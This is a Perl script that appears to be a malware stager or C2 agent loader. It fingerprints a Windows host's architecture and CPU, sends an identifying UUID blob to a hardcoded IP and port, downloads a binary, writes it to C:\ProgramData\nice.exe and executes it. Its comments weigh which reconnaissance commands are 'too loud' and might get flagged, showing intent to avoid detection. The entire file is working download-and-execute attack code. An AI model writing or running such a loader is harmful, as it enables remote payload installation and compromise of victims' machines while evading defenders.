use strict;
use IO::Socket::INET;
use Scalar::Util qw(reftype);
use Config;
use Encode qw/encode/;


# set variables
my $host = '10.20.80.48';
my $port = '4153';
my $outputfile = "C:\\ProgramData\\nice.exe";
# bytes padding correct
my $padding = "\x00"x7 . "\x27";
# UUID name
my $name="39519bc2-9c07-4e76-8774-0554edcaf7c4";
# OS information
my $OS = 'W';
# cpu info
my $PROC = '';
my $ARCH = '';


# ARCH
if (index($Config{'archname'}, '64') != -1){
	$ARCH = '6';

} 
else {
	$ARCH = '3';
}


# PROC - might be a better way to do this like python, also we are checking string twice.
#my $proc = `cat /proc/cpuinfo | grep Intel`;

# wmic CPU Get DataWidth 
# wmic CPU Get Manufacturer <- this is too loud and not sure if systeminfo will get flagged too also it doesn't look like $config has a cpu name option
# systeminfo prints multiple lines but with index we only need the string after the comma to exist and then we set $PROC
if (index(my $proc = `systeminfo`, 'Intel') != -1){
	 $PROC = 'I';
}
elsif (index(my $proc = `systeminfo`, 'ARM') != -1){
	 $PROC = 'A';
} 
elsif (index(my $proc = `systeminfo`, 'MIPS')!= -1){
	$PROC = 'M';
}


# encode to bytes
my $fullname = encode("UTF8", $padding) . encode("UTF8", $name) . encode("UTF8", $OS) . encode("UTF8", $ARCH) . encode("UTF8", $PROC); 


####
# Begin socket connection
####

# auto-flush on socket
$| = 1;
 
# create a connecting socket
my $socket = new IO::Socket::INET (
    PeerHost => $host,
    PeerPort => $port,
    Proto => 'tcp',
);
die "cannot connect to the server $!\n" unless $socket;

 
# data to send to a server
my $size = $socket->send($fullname);

# notify server that request has been sent
shutdown($socket, 1);
 
# receive a response of up to 1024 characters from server
my $out = '';

while (1){

	my $response = '';
	$socket->recv($response, 1024);
	if(not $response){
		last;
	}
	$out .= $response;
}

# write raw data of agent to output file location
open( my $outfile, '>:raw', $outputfile);
binmode $outfile;
print $outfile $out;

# close socket
$socket->close();




###############

# change perms so we can execute -- does a chmod(+x file) exist? couldn't get it working
#chmod 0777, $outputfile or die "couldn't change $outputfile: $!";

# execute 
system($outputfile);



